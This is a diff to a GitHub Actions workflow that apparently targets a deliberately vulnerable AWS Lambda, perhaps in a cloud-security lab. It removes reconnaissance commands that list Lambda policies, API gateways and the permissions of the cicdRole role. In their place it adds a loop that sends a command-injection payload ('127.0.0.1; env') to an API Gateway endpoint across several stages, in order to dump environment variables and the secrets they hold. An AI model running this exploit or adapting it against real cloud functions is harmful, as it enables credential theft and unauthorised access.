@@ -21,17 +21,32 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          echo "=== 1. CHECKING LAMBDA RESOURCE POLICY ==="
-          # This reveals what services are allowed to trigger the function
-          aws lambda get-policy --function-name nslookupv2 > policy.json || echo "Access Denied to GetPolicy"
-          cat policy.json
+          API_ID="3q931syi7b"
+          REGION="us-east-1"
           
-          echo "=== 2. ENUMERATING API GATEWAYS ==="
-          # If it's attached to an API, these commands will find the API IDs
-          aws apigateway get-rest-apis || echo "Access Denied to v1 APIs"
-          aws apigatewayv2 get-apis || echo "Access Denied to v2 APIs"
+          # 1. Define common stages to test
+          STAGES=("prod" "dev" "stage" "")
           
-          echo "=== 3. CHECKING OUR OWN PERMISSIONS ==="
-          # Let's see exactly what policies are attached to our cicdRole so we know our limits
-          aws iam list-attached-role-policies --role-name cicdRole || echo "Access Denied to Attached Policies"
-          aws iam list-role-policies --role-name cicdRole || echo "Access Denied to Inline Policies"
+          # 2. Payload with command injection
+          # We send JSON: {"domain": "google.com; env"}
+          PAYLOAD='{"domain": "127.0.0.1; env"}'
+          
+          echo "=== ATTACKING API ENDPOINT ==="
+          
+          for STAGE in "${STAGES[@]}"; do
+            if [ -z "$STAGE" ]; then
+              URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/"
+            else
+              URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/${STAGE}/"
+            fi
+            
+            echo "Testing URL: $URL"
+            
+            # Send POST request
+            RESPONSE=$(curl -s -X POST "$URL" \
+              -H "Content-Type: application/json" \
+              -d "$PAYLOAD")
+            
+            echo "Response: $RESPONSE"
+            echo "-----------------------------------"
+          done
